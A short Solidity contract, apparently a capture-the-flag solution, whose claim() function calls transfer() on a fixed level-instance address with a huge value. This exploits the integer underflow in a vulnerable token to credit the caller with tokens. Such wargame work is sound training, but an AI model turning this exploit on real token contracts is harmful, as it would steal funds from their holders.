// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.16;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Token {
    address levelInstance = address(0x73979AA11E0AF63c29e9e2b5E3b4A3Ca49261C03);

    function claim() public {
        IToken(levelInstance).transfer(msg.sender, 999999999999999);
    }
}
